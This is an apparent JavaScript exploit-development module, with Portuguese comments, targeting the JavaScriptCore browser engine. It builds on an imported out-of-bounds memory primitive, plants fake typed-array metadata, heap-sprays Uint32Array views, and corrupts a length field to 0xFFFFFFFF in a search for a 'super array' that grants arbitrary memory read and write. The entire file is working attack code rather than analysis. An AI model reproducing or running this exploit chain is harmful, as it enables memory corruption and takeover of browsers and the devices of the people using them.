// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.19"; // Versão atualizada

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const FAKE_VIEW_METADATA_OFFSET_IN_OOB = 0x58;

// Valores para os metadados falsos que plantaremos na armadilha
const PLANT_STRUCTURE_ID_IN_TRAP   = (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== null) ? JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID : 2;
const PLANT_FLAGS_IN_TRAP          = 0x01000100;
const PLANT_ASSOC_BUF_IN_TRAP      = AdvancedInt64.Zero; // Idealmente, o endereço de oob_array_buffer_real
const PLANT_MVECTOR_IN_TRAP        = AdvancedInt64.Zero; // m_vector = 0
// m_length e m_mode na armadilha serão definidos pela CORRUPTION_VALUE_TRIGGER escrita em CORRUPTION_OFFSET_TRIGGER (0x70)
const EXPECTED_MLENGTH_IN_TRAP     = CORRUPTION_VALUE_TRIGGER.low();  // 0xFFFFFFFF
const EXPECTED_MMODE_IN_TRAP       = CORRUPTION_VALUE_TRIGGER.high(); // 0xFFFFFFFF

let EXPECTED_UINT32ARRAY_STRUCTURE_ID = 0xBADBAD00 | 43; // Placeholder, idealmente descoberto


// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.19)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.trapVerificationAndSuperArrayTest_v10.19`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Verificação da Armadilha e Teste de SuperArray ---`, "test", FNAME_CURRENT_TEST);

    const NUM_SPRAY_VIEWS = 50;
    const SPRAY_VIEW_ELEMENT_COUNT = 8;

    let sprayedVictimViews = [];
    let superArray = null;
    let superArrayIndex = -1;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            throw new Error("OOB Init falhou.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        const sidForLog = EXPECTED_UINT32ARRAY_STRUCTURE_ID; // Para o log
        logS3(`   AVISO IMPORTANTE: Usando EXPECTED_UINT32ARRAY_STRUCTURE_ID: ${String(sidForLog)} (Hex: ${toHex(sidForLog)}). ATUALIZE SE CONHECIDO!`, "warn", FNAME_CURRENT_TEST);


        // 1. Preparar a "Armadilha de Metadados" no oob_array_buffer_real
        const sid_addr      = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // 0x58
        const flags_addr    = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET;      // 0x5C
        const assoc_buf_addr= FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET; // 0x60
        const mvec_addr     = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;       // 0x68
        const mlen_addr     = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;       // 0x70
        const mmode_addr    = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;       // 0x74

        logS3(`FASE 1: Preparando "armadilha de metadados" em ${toHex(FAKE_VIEW_METADATA_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(sid_addr, PLANT_STRUCTURE_ID_IN_TRAP, 4);
        oob_write_absolute(flags_addr, PLANT_FLAGS_IN_TRAP, 4);
        oob_write_absolute(assoc_buf_addr, PLANT_ASSOC_BUF_IN_TRAP, 8);
        oob_write_absolute(mvec_addr, PLANT_MVECTOR_IN_TRAP, 8);
        // m_length e m_mode em 0x70 e 0x74 serão definidos pela CORRUPTION_VALUE_TRIGGER
        logS3(`  Armadilha (pré-corrupção 0x70): SID=${toHex(PLANT_STRUCTURE_ID_IN_TRAP)}, mvec=${PLANT_MVECTOR_IN_TRAP.toString(true)}`, "info", FNAME_CURRENT_TEST);

        // 2. Heap Spraying
        logS3(`FASE 2: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800;
        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
            if (current_data_offset_for_view + (SPRAY_VIEW_ELEMENT_COUNT * 4) > oob_array_buffer_real.byteLength) break;
            try {
                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
                view[0] = (0xFACE0000 | i);
                sprayedVictimViews.push(view);
                current_data_offset_for_view += (SPRAY_VIEW_ELEMENT_COUNT * 4) + 0x80;
            } catch (e_spray) { break; }
        }
        logS3(`Pulverização de ${sprayedVictimViews.length} views concluída.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(200);

        // 3. Acionar a Corrupção Principal (em 0x70)
        // Esta escrita finaliza a armadilha, definindo m_length e m_mode.
        logS3(`FASE 3: Acionando escrita em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)} para finalizar armadilha.`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        await PAUSE_S3(100);

        // Verificar a armadilha
        const final_sid_in_trap = oob_read_absolute(sid_addr, 4);
        const final_mvec_in_trap = oob_read_absolute(mvec_addr, 8);
        const final_mlen_in_trap = oob_read_absolute(mlen_addr, 4);
        const final_mmode_in_trap = oob_read_absolute(mmode_addr, 4);

        logS3(`  Armadilha em ${toHex(FAKE_VIEW_METADATA_OFFSET_IN_OOB)} APÓS trigger de 0x70:`, "info", FNAME_CURRENT_TEST);
        logS3(`    SID =${toHex(final_sid_in_trap)} (Plantado: ${toHex(PLANT_STRUCTURE_ID_IN_TRAP)})`, "info", FNAME_CURRENT_TEST);
        logS3(`    mvec=${final_mvec_in_trap.toString(true)} (Plantado: ${PLANT_MVECTOR_IN_TRAP.toString(true)})`, "info", FNAME_CURRENT_TEST);
        logS3(`    mlen=${toHex(final_mlen_in_trap)} (Esperado: ${toHex(EXPECTED_MLENGTH_IN_TRAP)})`, "info", FNAME_CURRENT_TEST);
        logS3(`    mmode=${toHex(final_mmode_in_trap)} (Esperado: ${toHex(EXPECTED_MMODE_IN_TRAP)})`, "info", FNAME_CURRENT_TEST);

        // CORREÇÃO DO TypeError:
        const isTrapVectorCorrect = isAdvancedInt64Object(final_mvec_in_trap) && final_mvec_in_trap.low() === PLANT_MVECTOR_IN_TRAP.low() && final_mvec_in_trap.high() === PLANT_MVECTOR_IN_TRAP.high();
        const isTrapLengthCorrect = final_mlen_in_trap === EXPECTED_MLENGTH_IN_TRAP;
        const isTrapModeCorrect = final_mmode_in_trap === EXPECTED_MMODE_IN_TRAP;
        const isTrapSidCorrect = final_sid_in_trap === PLANT_STRUCTURE_ID_IN_TRAP;

        if (!(isTrapVectorCorrect && isTrapLengthCorrect && isTrapModeCorrect && isTrapSidCorrect)) {
            logS3("    AVISO: A armadilha de metadados não foi configurada como esperado!", "warn", FNAME_CURRENT_TEST);
        } else {
            logS3("    Armadilha de metadados configurada com sucesso em 0x58!", "good", FNAME_CURRENT_TEST);
        }


        // 4. Tentar Identificar e Usar o "Super Array" (View)
        logS3(`FASE 4: Tentando identificar uma "Super View" entre as ${sprayedVictimViews.length} pulverizadas...`, "info", FNAME_CURRENT_TEST);
        const MARKER_VALUE_TO_WRITE = 0xABCDDCBA;
        const MARKER_TEST_OFFSET_IN_OOB_BUFFER = 0xA0;
        const MARKER_TEST_INDEX_IN_VIEW = MARKER_TEST_OFFSET_IN_OOB_BUFFER / 4;

        let original_value_at_marker_offset = 0;
        try { original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, 4); } catch(e){}

        oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, MARKER_VALUE_TO_WRITE, 4);

        for (let i = 0; i < sprayedVictimViews.length; i++) {
            try {
                if (sprayedVictimViews[i][MARKER_TEST_INDEX_IN_VIEW] === MARKER_VALUE_TO_WRITE) {
                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador de dados inicial: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
                    superArray = sprayedVictimViews[i];
                    superArrayIndex = i;
                    document.title = `SUPER VIEW[${i}] ATIVA?`;

                    const sid_offset_in_fake_meta = FAKE_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
                    const sid_index_in_superarray = sid_offset_in_fake_meta / 4;

                    if ((sid_offset_in_fake_meta % 4 === 0) && superArray.length > sid_index_in_superarray ) {
                        const sid_read_by_superarray = superArray[sid_index_in_superarray];
                        logS3(`      LIDO COM SUPERARRAY: StructureID (da armadilha em ${toHex(FAKE_VIEW_METADATA_OFFSET_IN_OOB)}) é ${toHex(sid_read_by_superarray)}`, "leak", FNAME_CURRENT_TEST);
                        if (sid_read_by_superarray === PLANT_STRUCTURE_ID_IN_TRAP) {
                             logS3(`        CONFIRMADO: O superArray está lendo o SID (${toHex(PLANT_STRUCTURE_ID_IN_TRAP)}) que plantamos na armadilha!`, "good", FNAME_CURRENT_TEST);
                        }
                    }
                    break;
                }
            } catch (e_access) { /* Ignora */ }
        }
        try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, original_value_at_marker_offset, 4); } catch(e){}

        if (superArray) {
            logS3(`    Primitiva de Leitura/Escrita via 'superArray' (View em sprayedVictimViews[${superArrayIndex}]) parece funcional!`, "vuln", FNAME_CURRENT_TEST);
            document.title = `SUPER_ARRAY[${superArrayIndex}] OK!`;
        } else {
            logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
        }
        logS3("INVESTIGAÇÃO CONCLUÍDA.", "test", FNAME_CURRENT_TEST);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedVictimViews = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
